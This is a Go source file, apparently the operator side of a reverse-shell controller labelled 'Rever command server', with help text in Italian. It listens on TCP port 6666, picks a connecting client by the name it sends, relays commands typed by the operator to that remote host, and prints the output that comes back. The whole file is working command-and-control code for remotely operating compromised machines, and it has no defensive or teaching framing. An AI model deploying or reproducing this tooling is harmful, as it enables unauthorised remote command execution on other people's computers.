package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

const (
	CONN_PORT = "6666"
	CONN_TYPE = "tcp"
)

func main() {
	// Listen for incoming connections.
	l, err := net.Listen(CONN_TYPE, ":"+CONN_PORT)
	found := false
	client_req := " "
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}
	// Close the listener when the application closes.
	defer l.Close()
	fmt.Println("Listening on " + ":" + CONN_PORT)
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("[main]: Client: ")
	client_req, _ = reader.ReadString('\n')
	for {
		if found == true {
			fmt.Print("[main]: Client: ")
			client_req, _ = reader.ReadString('\n')
		}
		if strings.Compare(client_req, "help\n") == 0 {
			help()
		} else {
			conn, err := l.Accept()
			if err != nil {
				fmt.Println("Error accepting: ", err.Error())
				os.Exit(1)
			}
			buf := make([]byte, 1024)
			n, _ := conn.Read(buf)
			client := string(buf[:n])
			fmt.Println("[main]: New connection ", client_req[:len(client_req)-1], " - ", client[:len(client)])
			if strings.Compare(client_req[:len(client_req)-1], client[:len(client)]) == 0 {
				fmt.Println("[main]: Lock connection...")
				handleRequest(conn, client)
				found = true
			} else {
				fmt.Println("[main]: Close connections...")
				conn.Close()
				found = false
			}
		}
		time.Sleep(3 * time.Second)
	}
}

func handleRequest(conn net.Conn, client string) {
	fmt.Println("[handler]: ok..")
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("[handler]: Command for %s: ", client[:len(client)])
		cmd, _ := reader.ReadString('\n')
		if strings.Compare(cmd, "quit\n") == 0 {
			fmt.Println("[handler]: Chiudo...")
			exec_command(conn, cmd)
			break
		}
		if strings.Compare(cmd, "exit\n") == 0 {
			fmt.Println("[handler]: Esco...")
			exec_command(conn, cmd)
			break
		}
		if strings.Compare(cmd, "help\n") == 0 {
			help()
		}
		result := exec_command(conn, cmd)
		fmt.Println(result)
	}
	conn.Close()
}

func exec_command(conn net.Conn, command string) string {
	conn.Write(to_byte(command))
	buf := make([]byte, 256)
	cmd_output := make([]byte, 256)
	for {
		reqLen, _ := conn.Read(buf)
		if reqLen < 256 {
			cmd_output = append(cmd_output, buf[:reqLen]...)
			break
		} else {
			cmd_output = append(cmd_output, buf[:reqLen]...)
		}
	}
	return string(cmd_output[:len(cmd_output)])
}

func help() {
	fmt.Println("##############################################################")
	fmt.Println("##############Rever command server############################")
	fmt.Println("")
	fmt.Println("Comandi controllo server:")
	fmt.Println("Immettere il nome del client desiderato e attendere la connessiome")
	fmt.Println("help: visualizza l'help")
	fmt.Println("Comandi di controllo client:")
	fmt.Println("exit: chiude la connessione con il client")
	fmt.Println("quit: Chiude il client")
	fmt.Println("")
	fmt.Println("##############################################################")
}

func to_byte(f string, args ...interface{}) []byte {
	return []byte(fmt.Sprintf(f, args...))
}
